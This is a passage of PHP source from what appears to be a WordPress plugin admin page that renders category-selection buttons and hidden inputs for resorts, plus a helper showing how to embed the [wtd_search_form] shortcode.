    foreach ($not_allowed as $n)
        $exclude[] = $n->term_id;

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['activities'];

    foreach ($exclude as $x)
        unset($cats[$x]);

    foreach ($options['wtd_resorts'] as $resort){
        echo '<section id="'.$place.'_'.$resort.'_first" class="resort_hide" data-place="'.$place.'">';
        foreach ($cats as $key => $pcategory){
            $category = $pcategory['parent'];
            $icon = 'el-icon-check';
            if (!empty($options[$place][$resort][$category->term_id]['parent']))
                $icon = 'el-icon-check-empty';
            echo '<a href="javascript:void(0);" class="button wtd_cat wtd_shortcode_button" data-place="'.$place.'" data-term="'.$category->term_id.'" data-resort="'.$resort.'"><label class="term-count">'.$category->count.'</label><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
        }
        echo '</section>';
    }
    echo '<section id="'.$place.'_inputs">';
    foreach ($options['wtd_resorts'] as $resort){
        if (!empty($options[$place][$resort])){
            foreach ($options[$place][$resort] as $term_id => $val){
                if (!empty($val['parent']))
                    echo '<input type="hidden" data-term="'.$term_id.'" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
                if (!empty($val['children']))
                    foreach($val['children'] as $child_id => $child){
                        echo '<input type="hidden" data-term="'.$child_id.'" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                    }
            }
        }
    }
    echo'</section>';
}

function wtd_shortcode_display($field,$value){

    ?>
    <p>Post/Page Content&nbsp;&nbsp;&nbsp;<pre id="wtd_pre_post">[wtd_search_form]</pre></p>
    <p>Theme File&nbsp;&nbsp;&nbsp;<pre id="wtd_pre_theme"><?php echo '&lt;?php echo do_shortcode(\'[wtd_search_form]\'); ?>' ;?> </pre></p>
    <p>You can display the search form by inserting the code above inside your post/page content or your theme files.</p>
    <?php

}
